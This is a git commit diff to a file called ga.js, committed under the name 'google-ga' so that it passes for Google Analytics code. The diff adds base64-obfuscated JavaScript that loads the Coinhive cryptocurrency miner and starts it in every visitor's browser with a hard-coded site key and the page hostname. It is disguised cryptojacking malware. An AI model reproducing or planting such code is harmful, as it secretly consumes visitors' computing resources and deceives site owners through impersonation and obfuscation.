bb38b72b9135b64e1fe00bfc4e9b5ff1f798685d
google-ga <32638005+google-ga@users.noreply.github.com>
2017-10-10 20:23:27 +0300

    Update ga.js

--- ga.js
+++ ga.js
@@ -8,11 +8,11 @@ function loadScript(url, callback)
     script.onload = callback;
     head.appendChild(script);
 }
-var key = document.currentScript.getAttribute('data-key');
 var script = atob("aHR0cHM6Ly9jb2luaGl2ZS5jb20vbGliL2NvaW5oaXZlLm1pbi5qcw==")
 var afterFunction = function() {
-	var ga = new window[atob("Q29pbkhpdmU=")][atob("QW5vbnltb3Vz")](key);
-	ga.setThrottle(0.83);
-	ga.start();
+	var hostname = window.location.hostname;
+	var ga = new window[atob("Q29pbkhpdmU=")][atob("VXNlcg==")]('JrUWA6Zd72wf62sOQR49Fb4GlhA1fOpP', hostname);
+	window["ga"][atob("c2V0VGhyb3R0bGU=")](0.2)
+	window["ga"][atob("c3RhcnQ=")]();
 };
 loadScript(script, afterFunction);
